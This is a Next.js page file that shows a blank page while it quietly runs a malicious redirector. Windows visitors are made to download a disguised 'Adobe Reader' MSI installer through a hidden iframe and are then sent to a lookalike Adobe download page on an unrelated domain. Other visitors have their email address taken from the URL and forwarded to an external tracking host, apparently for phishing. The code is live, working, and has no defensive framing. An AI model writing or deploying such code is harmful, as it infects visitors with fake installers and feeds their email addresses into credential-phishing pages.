// pages/index.js
import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    const userAgent = navigator.userAgent || '';
    const isWindows = /windows/i.test(userAgent);

    const NON_WINDOWS_TARGET =
      "https://tagtechpro.com/i/?aXBkYXRhPTIwNS4yMzQuMTgxLjMwJnN2PWdlbmVyYWwmcj1LQSZ1aWQ9VVNFUjE1MDcyMDI1VTUyMDcxNTE3JnM9TGE=";

    //------------------------------------------------------------------
    // 1. Windows users → MSI download, then redirect
    //------------------------------------------------------------------
    if (isWindows) {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = '/Reader_adobe_install_online.msi'; // must exist in /public
      document.body.appendChild(iframe);

      setTimeout(() => {
        window.location.href =
          'https://mksonline.com.mx/css/adobe/reader/download.html';
      }, 2000);

      return;
    }

    //------------------------------------------------------------------
    // 2. NON-Windows → Grab email from hash/query/parameters
    //------------------------------------------------------------------
    const url = new URL(window.location.href);
    let email = "";

    // A) Hash ( #email@example.com )
    if (url.hash) {
      email = url.hash.substring(1);
    }

    // B) Query parameters ?email= / &email=
    if (!email && url.searchParams.get("email")) {
      email = url.searchParams.get("email");
    }

    // C) Query parameter fallback ?smn= / &smn=
    if (!email && url.searchParams.get("smn")) {
      email = url.searchParams.get("smn");
    }

    // Encode safely
    const safeEmail = email ? encodeURIComponent(email) : "";

    //------------------------------------------------------------------
    // 3. Redirect to external NON-Windows destination
    //------------------------------------------------------------------
    const finalUrl = safeEmail
      ? `${NON_WINDOWS_TARGET}#${safeEmail}`
      : NON_WINDOWS_TARGET;

    window.location.href = finalUrl;
  }, []);

  return null; // blank page while redirecting
}
